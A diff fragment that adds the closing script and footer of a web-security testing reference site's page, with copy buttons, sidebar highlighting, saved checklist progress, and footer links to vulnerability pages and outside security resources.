+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'oauth-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
